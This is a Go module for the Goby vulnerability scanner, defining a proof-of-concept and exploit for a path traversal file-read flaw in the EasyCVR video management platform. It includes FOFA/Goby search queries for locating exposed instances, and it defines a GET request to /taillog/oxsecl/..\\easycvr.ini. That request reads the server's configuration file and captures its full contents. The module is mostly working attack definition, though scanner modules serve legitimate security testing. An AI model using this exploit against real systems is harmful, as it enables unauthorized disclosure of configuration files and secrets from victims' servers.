package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "EasyCVR /taillog/oxsecl/ File Read Vulnerability",
    "Description": "<p>Path traversal vulnerability triggered by a GET request.</p>",
    "Product": "EasyCVR",
    "Homepage": "https://www.tsingsee.com/product/easycvr/",
    "DisclosureDate": "2024-12-10",
    "PostTime": "2024-12-12",
    "Author": "zhubao@baimaohui.net",
    "FofaQuery": "(body=\"EasyGBS\" || body=\"EasyDarwin.Body\" || body=\"EasyCVR\") && (title=\"\" || title=\"EasyCVR\")",
    "GobyQuery": "(body=\"EasyGBS\" || body=\"EasyDarwin.Body\" || body=\"EasyCVR\") && (title=\"\" || title=\"EasyCVR\")",
    "Level": "1",
    "Impact": "<p>Potential path traversal vulnerability that could lead to sensitive file disclosure.</p>",
    "Recommendation": "<p>Restrict user input and strictly validate file paths to prevent path traversal attacks.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144302291?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "easycvr.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "路径穿越",
        "Content": "通过修改请求路径，访问服务器上不应该暴露的文件。"
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/taillog/oxsecl/..\\\\easycvr.ini",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": "确保 HTTP 状态码为 200"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "模式",
                        "bz": "检查响应体是否包含敏感文件内容，表示读取成功"
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable| {{{fixedhostinfo}}}/taillog/oxsecl/..\\\\easycvr.ini"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/taillog/oxsecl/..\\\\easycvr.ini",
                "follow_redirect": true,
                "header": {
                    "Host": "",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": "确保 HTTP 状态码为 200"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "模式",
                        "bz": "检查响应体是否包含敏感文件内容，表示路径穿越成功"
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "EasyCVR /taillog/oxsecl/ 文件读取漏洞",
            "Product": "EasyCVR",
            "Description": "<p>通过 GET 请求触发的文件读取验证。</p>",
            "Recommendation": "<p>关闭互联网暴露面</p><p>给接口增加权限校验</p>",
            "Impact": "<p>EasyCVR-视频管理平台 taillog 接口存在任意文件读取漏洞，会导致攻击者能够获取到系统中的敏感信息，如配置文件、秘钥等，从而引发信息泄露、业务中断等危险服务器和整个网路的安全<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "EasyCVR /taillog/oxsecl/ File Read Vulnerability",
            "Product": "EasyCVR",
            "Description": "<p>Path traversal vulnerability triggered by a GET request.</p>",
            "Recommendation": "<p>Restrict user input and strictly validate file paths to prevent path traversal attacks.</p>",
            "Impact": "<p>Potential path traversal vulnerability that could lead to sensitive file disclosure.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9977"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
